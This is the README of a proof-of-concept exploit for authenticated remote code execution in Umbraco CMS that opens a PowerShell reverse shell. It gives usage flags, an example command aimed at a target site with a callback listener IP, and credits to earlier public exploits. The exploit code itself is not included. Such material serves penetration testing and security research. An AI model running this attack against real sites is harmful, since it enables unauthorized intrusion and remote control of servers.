# Umbraco RCE PowerShell Reverse Shell PoC

## Usage
```
usage: exploit.py [-h] -u USER -p PASS -w URL -i IP [-o PORT]

Umbraco authenticated RCE

optional arguments:
  -h, --help                 show this help message and exit
  -u USER, --user USER       Username / Email
  -p PASS, --password PASS   Login password
  -w URL, --website-url URL  Root URL
  -i IP, --ip IP             IP address of callback listener
```
Examples:
```
python exploit.py -u admin@example.org -p password123 -w 'http://remote.website/' -i 10.10.10.1
```

## Requirements
To install dependencies:
```
pip install -r requirements.txt
```

## Reference
This is a touch-up of [noraj's PoC](https://github.com/noraj/Umbraco-RCE/) which is based off [EDB-ID-46153](https://www.exploit-db.com/exploits/46153).  
This version provides a PowerShell reverse shell upon execution.